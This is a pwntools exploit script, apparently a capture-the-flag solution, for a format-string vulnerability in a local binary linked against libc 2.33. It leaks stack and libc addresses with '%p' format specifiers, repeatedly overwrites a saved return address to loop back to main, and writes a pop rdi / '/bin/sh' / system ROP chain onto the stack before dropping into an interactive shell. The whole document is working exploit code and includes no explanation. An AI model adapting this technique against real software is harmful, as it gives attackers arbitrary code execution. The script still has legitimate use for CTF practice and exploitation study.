#!/usr/bin/env python2
from pwn import *

exe = ELF("./lib")
libc = ELF("/usr/lib/libc-2.33.so")
context.binary = exe
context.terminal = "kitty -e sh -c".split()
#context.log_level = "debug"

global io
breakpoints = '''
break *0x4007f3
break *0x400836
continue
'''
if len(sys.argv) > 1 and sys.argv[1] == "-ng":
    io = process(exe.path)
else:
    io = gdb.debug(exe.path, gdbscript=breakpoints)


def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sl(a): return io.sendline(a)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def reu(a): return io.recvuntil(a)
def rl(): return io.recvline(False)

pop_rdi = 0x27f75
bin_sh = 0x18c966
system = 0x4a120
rbp_offset = 0x21c8

def s1(x):
    reu("name?\n")
    sl(x)

def s2(x):
    reu("out?")
    sl(x)

def ret2main(offset=0):
    payload = "%22$n"
    payload += "%71x%20$n"
    payload += "%16320x%21$n"
    payload = payload.ljust(32,"A")
    payload += p64(stk_leak+rbp_offset+offset)
    payload += p64(stk_leak+rbp_offset+offset+1)
    payload += p64(stk_leak+rbp_offset+offset+5)
    s2(payload)

def inject_rop(stk,addr):
    hi,lo = int(hex(addr)[:8],16),int(hex(addr)[8:],16)
    assert hi>lo
    payload = "%{}x%12$n".format(lo)
    payload += "%{}x%13$n".format(hi-lo)
    payload = payload.ljust(32,"A")
    payload += p64(stk)
    payload += p64(stk+3)
    s1(payload)

s1("%p %27$p")

reu("there")
leak = rl().split()
stk_leak = int(leak[0],16)
libc_leak = int(leak[1],16)-0x27b25

log.info("Stack Leak -> "+hex(stk_leak))
log.info("Libc Leak -> "+hex(libc_leak))

ret2main()

ropchain = stk_leak+rbp_offset+24

inject_rop(ropchain+16,libc_leak+system)
ret2main(8)

inject_rop(ropchain+8,libc_leak+bin_sh)
ret2main(16)

inject_rop(ropchain,libc_leak+pop_rdi)
s2("give me the shell!")
reu("day!")

io.interactive()
